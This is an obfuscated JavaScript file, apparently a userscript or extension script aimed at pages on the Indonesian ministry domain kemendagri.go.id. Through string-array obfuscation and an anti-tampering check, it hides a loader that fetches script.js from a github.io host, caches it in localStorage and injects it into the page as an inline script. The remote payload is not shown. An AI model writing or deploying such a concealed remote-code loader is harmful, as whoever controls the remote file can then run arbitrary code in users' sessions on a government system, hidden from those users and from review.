(function (A, B) {
    const u = A();
    while (!![]) {
        try {
            const D = -parseInt(P(0x6)) / 0x1 + parseInt(P(0x8)) / 0x2 * (parseInt(P(0x4)) / 0x3) + -parseInt(P(0x9)) / 0x4 * (-parseInt(P(0x7)) / 0x5) + parseInt(P(0x2)) / 0x6 * (-parseInt(P(0x3)) / 0x7) + parseInt(P(0x5)) / 0x8 + -parseInt(P(0x0)) / 0x9 + -parseInt(P(0x1)) / 0xa * (parseInt(P(0xa)) / 0xb);
            if (D === B) break;
            else u['push'](u['shift']());
        } catch (h) {
            u['push'](u['shift']());
        }
    }
}(t, 0xe40b6));
const k = (function () {
        let A = !![];
        return function (B, u) {
            const D = A ? function () {
                if (u) {
                    const h = u['apply'](B, arguments);
                    return u = null, h;
                }
            } : function () {};
            return A = ![], D;
        };
    }()),
    m = k(this, function () {
        return m['toString']()['search']('(((.+)+)+)+$')['toString']()['constructor'](m)['search']('(((.+)+)+)+$');
    });
m();
let W = '20260614-0000';

function t() {
    const l = ['nJC5ntyXsgTPtgTI', 'mZqZnw9HA09ZsG', 'mJe1mhrRu0HXvq', 'nJm2ogzuAwfisG', 'nJi2mJK2sw5Ar0v6', 'mteWmJG4n2zAqKPVwq', 'mZb2yKXZAMW', 'mZiXnZiWnNvxDunsqW', 'n3LzBgr1va', 'mZe1nNjor01hBG', 'mtC0odyZmNjPtgLbwa'];
    t = function () {
        return l;
    };
    return t();
}

function P(O, G) {
    O = O - 0x0;
    const k = t();
    let m = k[O];
    if (P['VjmrkU'] === undefined) {
        var W = function (B) {
            const u = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let D = '',
                h = '',
                o = D + W,
                Y = ('' + function () {
                    return 0x0;
                })['indexOf']('\x0a') !== -0x1;
            for (let z = 0x0, V, l, j = 0x0; l = B['charAt'](j++); ~l && (V = z % 0x4 ? V * 0x40 + l : l, z++ % 0x4) ? D += Y || o['charCodeAt'](j + 0xa) - 0xa !== 0x0 ? String['fromCharCode'](0xff & V >> (-0x2 * z & 0x6)) : z : 0x0) {
                l = u['indexOf'](l);
            }
            for (let C = 0x0, N = D['length']; C < N; C++) {
                h += '%' + ('00' + D['charCodeAt'](C)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(h);
        };
        P['hctNNS'] = W, P['iCmYRf'] = {}, P['VjmrkU'] = !![];
    }
    const E = k[0x0],
        s = O + E,
        A = P['iCmYRf'][s];
    if (!A) {
        const B = function (u) {
            this['wzgvNA'] = u, this['yolNVo'] = [0x1, 0x0, 0x0], this['ACTJUq'] = function () {
                return 'newState';
            }, this['Fgcnde'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*', this['BZuNWW'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';
        };
        B['prototype']['xImnCL'] = function () {
            const u = new RegExp(this['Fgcnde'] + this['BZuNWW']),
                D = u['test'](this['ACTJUq']['toString']()) ? --this['yolNVo'][0x1] : --this['yolNVo'][0x0];
            return this['OwKLZR'](D);
        }, B['prototype']['OwKLZR'] = function (u) {
            if (!Boolean(~u)) return u;
            return this['Nkpxyw'](this['wzgvNA']);
        }, B['prototype']['Nkpxyw'] = function (u) {
            for (let D = 0x0, h = this['yolNVo']['length']; D < h; D++) {
                this['yolNVo']['push'](Math['round'](Math['random']())), h = this['yolNVo']['length'];
            }
            return u(this['yolNVo'][0x0]);
        }, ('' + function () {
            return 0x0;
        })['indexOf']('\x0a') === -0x1 && new B(P)['xImnCL'](), m = P['hctNNS'](m), P['iCmYRf'][s] = m;
    } else m = A;
    return m;
}
const E = 'kemendagri.go.id',
    s = location['href'];
if (s['search'](E) != -0x1) {
    localStorage['build'] != null ? localStorage['build'] != W && (localStorage['script'] = '', localStorage['build'] = W) : (localStorage['build'] = W, localStorage['script'] = '');
    const o = document['createElement']('div'),
        Y = document['querySelector']('body');
    o['setAttribute']('id', 'svm'), Y['appendChild'](o);
    const z = document['querySelector']('#svm'),
        V = document['createElement']('script');
    localStorage['script'] == null ? fetch('https://hendrik-svm.github.io/assets/sipd/script.js?t=' + W)['then'](function (A) {
        if (!A['ok']) throw new Error(A['statusText'] || 'Network\x20error');
        return A['text']();
    })['then'](function (A) {
        localStorage['script'] = A, V['textContent'] = A, z['appendChild'](V);
    })['catch'](function (A) {
        console['error']('Failed\x20to\x20fetch\x20script.js:', A);
    }) : localStorage['script'] != '' ? (V['textContent'] = localStorage['script'], z['appendChild'](V)) : fetch('https://hendrik-svm.github.io/assets/sipd/script.js?t=' + W)['then'](function (A) {
        if (!A['ok']) throw new Error(A['statusText'] || 'Network\x20error');
        return A['text']();
    })['then'](function (A) {
        localStorage['script'] = A, V['textContent'] = A, z['appendChild'](V);
    })['catch'](function (A) {
        console['error']('Failed\x20to\x20fetch\x20script.js:', A);
    });
}
